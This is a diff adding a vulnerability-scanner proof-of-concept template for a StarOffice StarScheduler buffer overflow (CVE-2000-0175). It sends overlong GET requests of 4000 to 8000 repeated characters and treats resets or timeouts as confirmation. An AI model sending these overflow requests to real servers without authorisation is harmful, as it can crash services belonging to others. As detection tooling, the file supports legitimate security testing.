@@ -1,0 +1,59 @@
+[info]
+author = "ave"
+description = "通过发送超长 GET 请求触发 StarOffice StarScheduler Web 服务器缓冲区溢出，检测服务器是否因溢出导致连接中断或超时"
+id = "POC-AVE-2000-0555"
+name = "StarOffice StarScheduler 缓冲区溢出漏洞 PoC"
+severity = "critical"
+tags = ["ave-2000-0555"]
+vuln_id = [
+    "CVE-2000-0175",
+    "AVE-2000-0555",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/starscheduler/{{repeat('A', 4000)}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection reset",
+    "connection refused",
+    "timeout",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/scheduler/{{repeat('B', 5000)}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection reset",
+    "connection refused",
+    "timeout",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{repeat('D', 8000)}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection reset",
+    "connection refused",
+    "timeout",
+]
